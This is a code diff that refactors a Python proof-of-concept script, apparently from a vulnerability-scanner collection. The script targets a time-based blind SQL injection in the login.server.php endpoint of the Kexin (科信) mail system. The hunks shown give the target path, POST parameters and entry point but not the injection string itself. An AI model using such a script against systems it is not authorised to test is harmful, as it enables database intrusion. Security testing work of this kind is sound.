@@ -11,20 +11,13 @@ import time
 import json
 import requests
 import warnings
-
-  
-
-class login_server_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['科信邮件系统login.server.php 时间盲注','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/prog/login.server.php"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         post_data = {
             "xjxfun":"Function_PostLogin",
             "xjxr":"1434907361662",
@@ -45,5 +38,4 @@ class login_server_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = login_server_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
